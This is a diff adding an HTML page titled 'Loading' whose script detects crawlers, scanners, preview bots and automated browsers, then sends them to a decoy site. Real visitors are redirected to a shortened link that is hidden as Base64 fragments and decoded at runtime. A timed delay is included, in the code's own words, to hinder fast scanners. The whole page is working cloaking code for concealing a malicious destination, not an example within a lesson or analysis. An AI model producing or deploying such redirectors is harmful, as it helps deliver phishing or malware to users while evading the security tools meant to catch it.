@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Loading</title>
+<script>
+// Obfuscated client‑side redirect (no developer comments)
+var bots = ["bot","crawler","spider","crawl","slurp","curl","wget","python","java","headless","phantomjs","selenium","puppeteer","playwright","jsdom","facebookexternalhit","twitterbot","whatsapp","telegram","discordbot","slackbot","vkshare","pinterest","lighthouse","pingdom","gtmetrix","semrush","ahrefs","mj12","dotbot","applebot","uptimerobot","site24x7","speedvisor","browserlab","checkbot","baiduspider","yandex","duckduckbot","exabot","petalbot","quantum","archive","webarchiver","netcraft","w3c","validator","gstatic","sogou","seznam","feedfetcher","msnbot","quora"];
+var ua = (navigator.userAgent || "").toLowerCase();
+var isBot = false;
+for (var i = 0; i < bots.length; i++) {
+  if (ua.indexOf(bots[i]) !== -1) { isBot = true; break; }
+}
+if (window.navigator.webdriver) { isBot = true; }
+// URL is stored as two Base64 fragments and reassembled at runtime
+var part1 = "aHR0cHM6Ly9"; // "https://"
+var part2 = "0aW55dXJsLmNvbS8zeWhiNDd0OA=="; // "tinyurl.com/3yhb47t8"
+var REAL_PAGE = atob(part1 + part2);
+var DECOY = "https://example.com";
+// Small delay before navigation to hinder fast scanners
+setTimeout(function(){
+  location.replace(isBot ? DECOY : REAL_PAGE);
+}, 200);
+</script>
+</head>
+<body></body>
+</html>
